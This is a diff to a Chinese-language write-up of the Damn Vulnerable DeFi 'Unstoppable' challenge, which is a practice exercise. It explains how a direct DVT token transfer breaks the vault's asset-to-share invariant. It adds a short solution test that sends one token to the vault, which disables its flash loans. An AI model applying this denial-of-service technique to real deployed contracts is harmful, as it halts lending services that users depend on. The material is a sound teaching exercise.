@@ -64,8 +64,18 @@ interface IERC3156FlashBorrower {
 `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`
 
 - `balanceBefore`由`totalAssets()`计算得出，是记录的当前合约持有的ERC20即DVT Token数目
-- `totalSupply`为DVT Token的ERC20合约方法
+- `totalSupply`为DVT Token的ERC20合约方法，记录了DVT的总数
 
-这里约束的条件是asset与share 1:1，只有用户存入asset时才会`_mint`出相应的share，取出时`_burn`
+这里约束的条件是asset与share 1:1，只有用户存入asset时才会`_mint`出相应的share代币，取出时`_burn` share代币
 
+可以通过直接给UnstoppableVault转帐DVT来使得asset与share不再相等，从而使闪电贷无法再工作
 
+## Code
+
+```javascript
+    it('Execution', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const dvtForPlayer  = token.connect(player);
+        await dvtForPlayer.transfer(vault.address,1);
+    });
+```
